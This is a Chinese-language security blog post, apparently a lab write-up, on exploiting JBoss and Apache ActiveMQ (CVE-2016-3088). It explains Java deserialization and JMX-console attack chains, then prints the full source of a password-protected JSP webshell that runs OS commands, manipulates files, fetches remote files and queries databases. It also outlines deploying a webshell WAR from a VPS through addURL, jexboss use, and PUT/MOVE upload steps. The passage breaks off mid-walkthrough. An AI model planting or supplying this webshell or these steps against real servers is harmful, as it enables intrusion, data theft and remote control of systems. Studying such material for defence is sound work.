@@ -1,0 +1,1088 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>JBoss</title>
+    <meta name="description" content="WildFly，原名JBoss AS或者JBoss，是一套应用程序服务器，属于开源的企业级Java中间件软件，用于实现基于SOA架构的web应用和服务。">
+
+    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
+    <link rel="stylesheet" href="/css/main.css ">
+    <link rel="canonical" href="http://localhost:4000/2017/09/27/Jboss/">
+    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">
+
+
+    <script>
+    // 百度统计代码
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+
+    <script>
+    // google analytics
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-111240288-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+
+
+
+</head>
+
+
+  <body>
+
+    <header id="top">
+    <div class="wrapper">
+        <a href="/" class="brand">Jirairya</a>
+        <small></small>
+        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
+        <nav id="headerNav">
+            <ul>
+                <li>
+                    
+                    <a href="/">
+                    
+                        <i class="fa fa-home"></i>Home
+                    </a>
+                </li>
+
+                
+                    
+                    <li>
+                        
+                        <a href="/archive/">
+                        
+                            <i class="fa fa-archive"></i>Archives
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/category/">
+                        
+                            <i class="fa fa-th-list"></i>Categories
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tag/">
+                        
+                            <i class="fa fa-tags"></i>Tags
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/collections/">
+                        
+                            <i class="fa fa-folder-open"></i>Collections
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/skills/">
+                        
+                            <i class="fa fa-bezier-curve"></i>Skills
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tools/">
+                        
+                            <i class="fa fa-toolbox"></i>Tools
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/about/">
+                        
+                            <i class="fa fa-paper-plane"></i>About
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="page clearfix" post>
+    <div class="left">
+        <h1>JBoss</h1>
+        <div class="label">
+
+            <div class="label-card">
+                <i class="fa fa-calendar"></i>2017-09-27
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+            
+
+
+<!-- <span class="point">•</span> -->
+<span class="categories">
+  <i class="fa fa-th-list"></i>
+  
+    
+        <a href="/category/#hack" title="Category: hack" rel="category">hack</a>&nbsp;
+    
+        <a href="/category/#sec" title="Category: sec" rel="category">sec</a>
+    
+  
+
+  <!-- <span class="point">•</span> -->
+</span>
+
+
+            </div>
+
+            <div class="label-card">
+            
+<!-- <span class="point">•</span> -->
+<span class="pageTag">
+  <i class="fa fa-tags"></i>
+  
+    
+        <!--a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a-->
+        <a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a>&nbsp;
+    
+        <!--a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a-->
+        <a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a>&nbsp;
+    
+        <!--a href="/tag/#web" title="Tag: web" rel="tag">web</a-->
+        <a href="/tag/#web" title="Tag: web" rel="tag">web</a>
+    
+  
+
+</span>
+
+            </div>
+
+        </div>
+        <hr>
+        <article itemscope itemtype="http://schema.org/BlogPosting">
+        <p>WildFly，原名JBoss AS或者JBoss，是一套应用程序服务器，属于开源的企业级Java中间件软件，用于实现基于SOA架构的web应用和服务。</p>
+
+<!--more-->
+
+<ul id="markdown-toc">
+  <li><a href="#基础知识" id="markdown-toc-基础知识">基础知识</a>    <ul>
+      <li><a href="#java反序列化" id="markdown-toc-java反序列化">Java反序列化</a></li>
+    </ul>
+  </li>
+  <li><a href="#jboss相关漏洞" id="markdown-toc-jboss相关漏洞">JBoss相关漏洞</a>    <ul>
+      <li><a href="#jboss-反序列化漏洞" id="markdown-toc-jboss-反序列化漏洞">JBoss 反序列化漏洞</a></li>
+      <li><a href="#利用addurl函数下载部署war" id="markdown-toc-利用addurl函数下载部署war">利用addURL函数下载部署war</a></li>
+      <li><a href="#apache-activemq-远程代码执行漏洞-cve-2016-3088" id="markdown-toc-apache-activemq-远程代码执行漏洞-cve-2016-3088">Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)</a></li>
+    </ul>
+  </li>
+  <li><a href="#参考" id="markdown-toc-参考">参考</a></li>
+</ul>
+
+<h2 id="基础知识">基础知识</h2>
+
+<h3 id="java反序列化">Java反序列化</h3>
+
+<p><strong>Java序列化</strong>就是将对象转换成字节流的过程，以便于保存在内存、文件、数据库中。Java中的<code class="highlighter-rouge">ObjectOutputStream</code>类的writeObject()方法可以实现序列化。</p>
+
+<p><strong>Java反序列化</strong>就是Java序列化的逆过程，由字节流还原成对象。<code class="highlighter-rouge">ObjectInputStream</code>类的<code class="highlighter-rouge">readObject()</code>方法用于反序列化。</p>
+
+<p>序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。主要应用于：</p>
+
+<ul>
+  <li>HTTP：多平台之间的通信，管理等</li>
+  <li>RMI：是 Java 的一组拥护开发分布式应用程序的 API，实现了不同操作系统之间程序的方法调用。值得注意的是，RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是 1099 端口。</li>
+  <li>JMX：JMX 是一套标准的代理和服务，用户可以在任何 Java 应用程序中使用这些代理和服务实现管理,中间件软件 WebLogic 的管理页面就是基于 JMX 开发的，而 JBoss 则整个系统都基于 JMX 构架。 ​</li>
+</ul>
+
+<p>暴露或间接暴露反序列化API，导致用户可以操作传入数据，若要利用Java反序列化的漏洞，就需要在反序列化的地方传入攻击者的序列化代码。</p>
+
+<p><code class="highlighter-rouge">ac ed 00 05</code>是 java 序列化内容的特征，如果经过 base64 编码，相对应的是<code class="highlighter-rouge">rO0AB</code></p>
+
+<p><strong>如何发现Java反序列化漏洞：</strong></p>
+<ul>
+  <li>从流量中发现序列化的痕迹，关键字：<code class="highlighter-rouge">ac ed 00 05</code>，<code class="highlighter-rouge">rO0AB</code></li>
+  <li>Java RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是1099端口</li>
+  <li>从源码入手，可以被序列化的类一定实现了Serializable接口</li>
+  <li>观察反序列化时的readObject()方法是否重写，重写中是否有设计不合理，可以被利用之处</li>
+</ul>
+
+<blockquote>
+  <p>从可控数据的反序列化或间接的反序列化接口入手，再在此基础上尝试构造序列化的对象。</p>
+
+  <p>ysoserial 是一款非常好用的 Java 反序列化漏洞检测工具，该工具通过多种机制构造 PoC ，并灵活的运用了反射机制和动态代理机制</p>
+</blockquote>
+
+<h2 id="jboss相关漏洞">JBoss相关漏洞</h2>
+
+<p>JBoss全称为<code class="highlighter-rouge">JBoss Application Server</code>，JBoss Application Server是一个基于Jave EE的web应用服务器。如果Jboss没有正确配置，它会允许攻击者进行各种恶意攻击</p>
+
+<p>基本的攻击思路：利用漏洞部署一个war（war是JavaEE里基本部署单位），这个war里一般只有一个jsp的webshell，利用此shell，进行目的攻击</p>
+
+<p>使用url部署一句话后门：</p>
+
+<p><img src="/img/hack/Jboss/1506306916784.png" alt="" /></p>
+
+<blockquote>
+  <p>JBoss收到这个请求后，就会部署shell.war的文件夹，其中只有一个shell.jsp文件，随后可利用该shell.jsp执行各种命令</p>
+</blockquote>
+
+<ul>
+  <li><em>标号2:</em><code class="highlighter-rouge">DeploymentFileRepository</code>是JBoss运行环境创建的JMX对象，可通过<code class="highlighter-rouge">jboss.admin:service</code>找到，这个对象实质是一个服务,可以部署一个文件</li>
+  <li><em>标号1：</em><code class="highlighter-rouge">jmx-console/HtmlAdaptor</code>的本质是JBoss内在服务的调用接口。JMX是为了方便运维和监控涉及的，是为了给每个服务主体创建一个“影子”对象，该“影子对象”可控制查看主体对象的一切。此处的<code class="highlighter-rouge">jmx-console/HtmlAdaptor</code>正是控制查看所有影子对象的一个总入口</li>
+  <li><em>标号3</em>：构造的攻击行为</li>
+</ul>
+
+<p>常见一些攻击方式：</p>
+
+<ol>
+  <li><code class="highlighter-rouge">jmx-console/HtmlAdaptor</code>+<code class="highlighter-rouge">DeploymentFileRepository</code>组合，比如JBoss蠕虫事件</li>
+  <li><code class="highlighter-rouge">jmx-console/HtmlAdaptor</code>+<code class="highlighter-rouge">BSHDeployer</code>组合，类似于1。BSH是一种JVM支持的shell语言，JBoss也就可以支持。这个方式是通过HTTP请求给BSHDeployer传递beanshell脚本，webshell可藏于该脚本中</li>
+  <li><code class="highlighter-rouge">web-console/Invoker</code>+<code class="highlighter-rouge">DeploymentFileRepository</code>组合，类似于1。只是换了调用接口，背后服务还是<code class="highlighter-rouge">DeploymentFileRepository</code></li>
+  <li><code class="highlighter-rouge">invoker/JMXInvokerServlet</code>+<code class="highlighter-rouge">application/x-java-serialized-object;class=org.jboss.invocation.MarshalledInvocation</code>+<code class="highlighter-rouge">BSHDeployer</code>组合，该方式不同于以上。以上几个组合在上传payload的时候可直接读取文本，该组合有变化，实质上是用了一个HTTP请求发送给RMI，此过程在原理上相当于在<em>2</em>组合上套了一层<code class="highlighter-rouge">MarshalledInvocation</code>调用。<code class="highlighter-rouge">MarshalledInvocation</code>，在Java中，可以方便将一次方法调用用一个Java类描述下来，随后将编译好的字节通过网络发送，服务端收到请求后，再解析该字节码中的调用信息，最后又把请求转给<code class="highlighter-rouge">BSHDeployer</code></li>
+  <li><code class="highlighter-rouge">invokeer/JMXinvokerServlet</code>+<code class="highlighter-rouge">application/x-java-serialized-object;class=org.jboss.invocation.MarshalledInvocation</code>+<code class="highlighter-rouge">MainDeployer</code>组合。该组合类似于<em>4</em>组合，不同体现在MainDeployer上，第4种组合用BSHDeployer时，webshell全部内容可以在请求中传输，而MainDeployer就不行，其需要指向远程war的url，<code class="highlighter-rouge">MainDeployer</code>将这个war下载下来之后，可再正常部署</li>
+</ol>
+
+<h3 id="jboss-反序列化漏洞">JBoss 反序列化漏洞</h3>
+
+<p><strong>0x01 配置环境：</strong></p>
+
+<p>下载<a href="http://js.9553.com/soft/jdk-8u66-windows-i586-20151102.rar">JDK1.8安装包</a>，并配置用户环境变量：</p>
+
+<p><img src="/img/hack/Jboss/1506330053653.png" alt="" /></p>
+
+<p>下载<a href="http://jbossas.jboss.org/downloads/">JBOSS AS服务器</a>：</p>
+
+<p><img src="/img/hack/Jboss/1506329902072.png" alt="" /></p>
+
+<p>配置环境变量：</p>
+
+<ul>
+  <li>JAVA_HOME变量
+    <ul>
+      <li>变量名：JAVA_HOME:</li>
+      <li>变量值：C:\Program Files\Java\jdk1.8.0_66</li>
+    </ul>
+  </li>
+  <li>JBOSS_HOME变量
+    <ul>
+      <li>变量名：JBOSS_HOME</li>
+      <li>变量值：C:\jboss-4.2.1.GA</li>
+    </ul>
+  </li>
+  <li>CLASSPATH变量
+    <ul>
+      <li>变量名：CLASSPATH</li>
+      <li>变量值：C:\jboss-4.2.1.GA\bin\run.jar</li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/img/hack/Jboss/1506329645392.png" alt="" /></p>
+
+<p>启动在JBOSS的bin目录下运行<code class="highlighter-rouge">run.bat</code>（根据报错配置环境变量）：</p>
+
+<p><img src="/img/hack/Jboss/1506330273574.png" alt="" /></p>
+
+<p>这时只能本地访问，将<code class="highlighter-rouge">$JBOSS_HOME\server\default\deploy\jboss-web.deployer\server.xml</code>配置文件的address参数改为<code class="highlighter-rouge">0.0.0.0</code>，设置防火墙策略，即可外网访问：</p>
+
+<p><img src="/img/hack/Jboss/1506333292086.png" alt="" /></p>
+
+<p><img src="/img/hack/Jboss/1506333317522.png" alt="" /></p>
+
+<p>检查配置环境，查看 该环境是否符合JBoss 反序列化漏洞的利用条件：</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>序号</th>
+      <th>自检内容</th>
+      <th>检查结果</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>JBoss JMXInvokerServlet接口（默认8080端口）以及JBoss Web Console （/web-console/） 是否禁止对外</td>
+      <td>不符合</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>以上系统是否都有在传输对象内容时，使用序列化技术（二进制流或base64encode）</td>
+      <td>不符合</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>当对这些传输数据截包并且被替换为“包含命令执行的序列化内容”时，远程命令执行即触发。</td>
+      <td>不符合</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>工具：</strong></p>
+
+<ul>
+  <li>Java反序列化集成工具</li>
+  <li>JBoss反序列化漏洞getshell工具</li>
+</ul>
+
+<p><img src="/img/hack/Jboss/1506391009972.png" alt="" /></p>
+
+<p>在文件管理中找出<code class="highlighter-rouge">ROOT.war</code>，一般的jboss web根目录位置在此($_jboss/server/default/deploy/jboss-web.deployer/ROOT.war)：</p>
+
+<p><img src="/img/hack/Jboss/1506391188138.png" alt="" /></p>
+
+<p>然后上传jsp一句话马：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;%</span><span class="nd">@page</span> <span class="kn">import</span><span class="err">="</span><span class="nn">java.io.*</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.*,</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.*,</span><span class="n">java</span><span class="o">.</span><span class="na">sql</span><span class="o">.*,</span><span class="n">java</span><span class="o">.</span><span class="na">text</span><span class="o">.*</span><span class="s">"%&gt;
+&lt;%!
+String Pwd="</span><span class="mi">1234</span><span class="s">";
+String EC(String s,String c)throws Exception{return s;}//new String(s.getBytes("</span><span class="n">ISO</span><span class="o">-</span><span class="mi">8859</span><span class="o">-</span><span class="mi">1</span><span class="s">"),c);}
+Connection GC(String s)throws Exception{String[] x=s.trim().split("</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="s">");Class.forName(x[0].trim()).newInstance();
+Connection c=DriverManager.getConnection(x[1].trim());if(x.length&gt;2){c.setCatalog(x[2].trim());}return c;}
+void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i&lt;r.length;i++){sb.append(r[i].toString().substring(0,2));}}
+void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF="";java.util.Date dt;
+SimpleDateFormat fm=new SimpleDateFormat("</span><span class="n">yyyy</span><span class="o">-</span><span class="n">MM</span><span class="o">-</span><span class="n">dd</span> <span class="nl">HH:mm:</span><span class="n">ss</span><span class="s">");for(int i=0;i&lt;l.length;i++){dt=new java.util.Date(l[i].lastModified());
+sT=fm.format(dt);sQ=l[i].canRead()?"</span><span class="n">R</span><span class="s">":"";sQ+=l[i].canWrite()?"</span> <span class="n">W</span><span class="s">":"";if(l[i].isDirectory()){sb.append(l[i].getName()+"</span><span class="o">/</span><span class="err">\</span><span class="n">t</span><span class="s">"+sT+"</span><span class="err">\</span><span class="n">t</span><span class="s">"+l[i].length()+"</span><span class="err">\</span><span class="n">t</span><span class="s">"+sQ+"</span><span class="err">\</span><span class="n">n</span><span class="s">");}
+else{sF+=l[i].getName()+"</span><span class="err">\</span><span class="n">t</span><span class="s">"+sT+"</span><span class="err">\</span><span class="n">t</span><span class="s">"+l[i].length()+"</span><span class="err">\</span><span class="n">t</span><span class="s">"+sQ+"</span><span class="err">\</span><span class="n">n</span><span class="s">";}}sb.append(sF);}
+void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();
+for(int k=0;k&lt;x.length;k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}
+void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();
+ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));
+os.write(("</span><span class="o">-&gt;</span><span class="s">"+"</span><span class="o">|</span><span class="s">").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write(("</span><span class="o">|</span><span class="s">"+"</span><span class="o">&lt;-</span><span class="s">").getBytes(),0,3);os.close();is.close();}
+void GG(String s, String d)throws Exception{String h="</span><span class="mo">01234567</span><span class="mi">89</span><span class="n">ABCDEF</span><span class="s">";int n;File f=new File(s);f.createNewFile();
+FileOutputStream os=new FileOutputStream(f);for(int i=0;i&lt;d.length();i+=2)
+{os.write((h.indexOf(d.charAt(i))&lt;&lt;4|h.indexOf(d.charAt(i+1))));}os.close();}
+void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();
+for(int j=0;j&lt;z.length;j++){HH(s+"</span><span class="o">/</span><span class="s">"+z[j].getName(),d+"</span><span class="o">/</span><span class="s">"+z[j].getName());}
+}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);
+int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}
+void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}
+void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat("</span><span class="n">yyyy</span><span class="o">-</span><span class="n">MM</span><span class="o">-</span><span class="n">dd</span> <span class="nl">HH:mm:</span><span class="n">ss</span><span class="s">");
+java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}
+void LL(String s, String d)throws Exception{URL u=new URL(s);int n;FileOutputStream os=new FileOutputStream(d);
+HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];
+while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}
+void MM(InputStream is, StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));
+while((l=br.readLine())!=null){sb.append(l+"</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="s">");}}
+void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();
+while(r.next()){sb.append(r.getString(1)+"</span><span class="err">\</span><span class="n">t</span><span class="s">");}r.close();c.close();}
+void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] t={"</span><span class="n">TABLE</span><span class="s">"};ResultSet r=c.getMetaData().getTables (null,null,"</span><span class="o">%</span><span class="s">",t);
+while(r.next()){sb.append(r.getString("</span><span class="n">TABLE_NAME</span><span class="s">")+"</span><span class="err">\</span><span class="n">t</span><span class="s">");}r.close();c.close();}
+void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split("</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="s">");Connection c=GC(s);
+Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery("</span><span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="s">"+x[3]);ResultSetMetaData d=r.getMetaData();
+for(int i=1;i&lt;=d.getColumnCount();i++){sb.append(d.getColumnName(i)+"</span> <span class="o">(</span><span class="s">"+d.getColumnTypeName(i)+"</span><span class="o">)</span><span class="err">\</span><span class="n">t</span><span class="s">");}r.close();m.close();c.close();}
+void QQ(String cs,String s,String q,StringBuffer sb)throws Exception{int i;Connection c=GC(s);Statement m=c.createStatement(1005,1008);
+try{ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i&lt;=n;i++){sb.append(d.getColumnName(i)+"</span><span class="err">\</span><span class="n">t</span><span class="o">|</span><span class="err">\</span><span class="n">t</span><span class="s">");
+}sb.append("</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="s">");while(r.next()){for(i=1;i&lt;=n;i++){sb.append(EC(r.getString(i),cs)+"</span><span class="err">\</span><span class="n">t</span><span class="o">|</span><span class="err">\</span><span class="n">t</span><span class="s">");}sb.append("</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="s">");}r.close();}
+catch(Exception e){sb.append("</span><span class="n">Result</span><span class="err">\</span><span class="n">t</span><span class="o">|</span><span class="err">\</span><span class="n">t</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="s">");try{m.executeUpdate(q);sb.append("</span><span class="n">Execute</span> <span class="n">Successfully</span><span class="o">!</span><span class="err">\</span><span class="n">t</span><span class="o">|</span><span class="err">\</span><span class="n">t</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="s">");
+}catch(Exception ee){sb.append(ee.toString()+"</span><span class="err">\</span><span class="n">t</span><span class="o">|</span><span class="err">\</span><span class="n">t</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="s">");}}m.close();c.close();}
+%&gt;&lt;%
+String cs=request.getParameter("</span><span class="n">z0</span><span class="s">")+"";request.setCharacterEncoding(cs);response.setContentType("</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="o">;</span><span class="n">charset</span><span class="o">=</span><span class="s">"+cs);
+String Z=EC(request.getParameter(Pwd)+"",cs);String z1=EC(request.getParameter("</span><span class="n">z1</span><span class="s">")+"",cs);String z2=EC(request.getParameter("</span><span class="n">z2</span><span class="s">")+"",cs);
+StringBuffer sb=new StringBuffer("");try{sb.append("</span><span class="o">-&gt;</span><span class="s">"+"</span><span class="o">|</span><span class="s">");
+if(Z.equals("</span><span class="n">A</span><span class="s">")){String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+"</span><span class="err">\</span><span class="n">t</span><span class="s">");if(!s.substring(0,1).equals("</span><span class="o">/</span><span class="s">")){AA(sb);}}
+else if(Z.equals("</span><span class="n">B</span><span class="s">")){BB(z1,sb);}else if(Z.equals("</span><span class="n">C</span><span class="s">")){String l="";BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));
+while((l=br.readLine())!=null){sb.append(l+"</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="s">");}br.close();}
+else if(Z.equals("</span><span class="n">D</span><span class="s">")){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
+bw.write(z2);bw.close();sb.append("</span><span class="mi">1</span><span class="s">");}else if(Z.equals("</span><span class="n">E</span><span class="s">")){EE(z1);sb.append("</span><span class="mi">1</span><span class="s">");}else if(Z.equals("</span><span class="n">F</span><span class="s">")){FF(z1,response);}
+else if(Z.equals("</span><span class="n">G</span><span class="s">")){GG(z1,z2);sb.append("</span><span class="mi">1</span><span class="s">");}else if(Z.equals("</span><span class="n">H</span><span class="s">")){HH(z1,z2);sb.append("</span><span class="mi">1</span><span class="s">");}else if(Z.equals("</span><span class="n">I</span><span class="s">")){II(z1,z2);sb.append("</span><span class="mi">1</span><span class="s">");}
+else if(Z.equals("</span><span class="n">J</span><span class="s">")){JJ(z1);sb.append("</span><span class="mi">1</span><span class="s">");}else if(Z.equals("</span><span class="n">K</span><span class="s">")){KK(z1,z2);sb.append("</span><span class="mi">1</span><span class="s">");}else if(Z.equals("</span><span class="n">L</span><span class="s">")){LL(z1,z2);sb.append("</span><span class="mi">1</span><span class="s">");}
+else if(Z.equals("</span><span class="n">M</span><span class="s">")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);
+MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals("</span><span class="n">N</span><span class="s">")){NN(z1,sb);}else if(Z.equals("</span><span class="n">O</span><span class="s">")){OO(z1,sb);}
+else if(Z.equals("</span><span class="n">P</span><span class="s">")){PP(z1,sb);}else if(Z.equals("</span><span class="n">Q</span><span class="s">")){QQ(cs,z1,z2,sb);}
+}catch(Exception e){sb.append("</span><span class="n">ERROR</span><span class="s">"+"</span><span class="o">:</span><span class="c1">// "+e.toString());}sb.append("|"+"&lt;-");out.print(sb.toString());</span>
+<span class="o">%&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/img/hack/Jboss/1506393121694.png" alt="" /></p>
+
+<p><img src="/img/hack/Jboss/1506393085876.png" alt="" /></p>
+
+<p><strong>使用jexboss getshell</strong></p>
+
+<p>下载：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="o">:</span><span class="c1">//github.com/joaomatosf/jexboss
+</span></code></pre></div></div>
+
+<p>使用：</p>
+
+<p><img src="/img/hack/Jboss/1506408342250.png" alt="" /></p>
+
+<h3 id="利用addurl函数下载部署war">利用addURL函数下载部署war</h3>
+
+<p>找到<code class="highlighter-rouge">JMX Console</code>，然后进入页面找<code class="highlighter-rouge">flavor=URL,type=DeploymentScanner</code></p>
+
+<p><img src="/img/hack/Jboss/1506394309687.png" alt="" /></p>
+
+<p>若<code class="highlighter-rouge">flavor=URL,type=DeploymentScanner</code>能访问，则打包webshell为war文件格式，将该war上传到vps上，然后，打开目标站点的<code class="highlighter-rouge">flavor=URL,type=DeploymentScanner</code>，然后利用<code class="highlighter-rouge">void addURL()</code>函数，将vps上的war包的webshell复制到<code class="highlighter-rouge">ParamValue</code>中，invoke之后，下载部署到目标机器</p>
+
+<h3 id="apache-activemq-远程代码执行漏洞-cve-2016-3088">Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)</h3>
+
+<p>漏洞影响版本：Apache ActiveMQ 5.x ~ 5.14.0</p>
+
+<p><strong>0x01 vps上搭建环境：</strong></p>
+
+<p>下载<a href="http://archive.apache.org/dist/activemq/5.10.1/apache-activemq-5.10.1-bin.tar.gz">ActiveMQ5.10.1</a>： http://archive.apache.org/dist/activemq/5.10.1/apache-activemq-5.10.1-bin.tar.gz</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wget</span> <span class="n">http</span><span class="o">:</span><span class="c1">//archive.apache.org/dist/activemq/5.10.1/apache-activemq-5.10.1-bin.tar.gz
+</span></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tar</span> <span class="o">-</span><span class="n">xvf</span> <span class="n">apache</span><span class="o">-</span><span class="n">activemq</span><span class="o">-</span><span class="mi">5</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">1</span><span class="o">-</span><span class="n">bin</span><span class="p">.</span><span class="n">tar</span><span class="p">.</span><span class="n">gz</span>
+</code></pre></div></div>
+
+<p>在vps上安装java环境：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="k">default</span><span class="o">-</span><span class="n">jre</span>
+<span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="k">default</span><span class="o">-</span><span class="n">jdk</span>
+</code></pre></div></div>
+
+<p><img src="/img/hack/Jboss/1506418712052.png" alt="" /></p>
+
+<p><img src="/img/hack/Jboss/1506418413089.png" alt="" /></p>
+
+<p><strong>0x02 测试：</strong></p>
+
+<p>开启代理，使用burpsuit，修改GET方式为PUT方式，点击go,爆出路径:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PUT</span> <span class="o">/</span><span class="n">fileserver</span><span class="o">/%</span><span class="mi">80</span><span class="o">/%</span><span class="mi">80</span>
+</code></pre></div></div>
+
+<p><img src="/img/hack/Jboss/1506482222163.png" alt="" /></p>
+
+<p>暴出路径之后，利用PUT方式上传马,直接上传jsp文件失败，尝试txt文件成功：</p>
+
+<p><img src="/img/hack/Jboss/1506482440039.png" alt="" /></p>
+
+<p>利用MOVE方式，将刚上传的txt文件更改权限更高的路径（刚爆出的/opt/apache-activemq-5.10.1/webapps/fileserver/的fileserver同级目录下的amdin目录），并更改其后缀名为jsp：</p>
+
+<p><img src="/img/hack/Jboss/1506482656223.png" alt="" /></p>
+
+<p>用菜刀连接和访问该马都失败，就换个思路，<strong>使用ssh密钥登陆</strong></p>
+
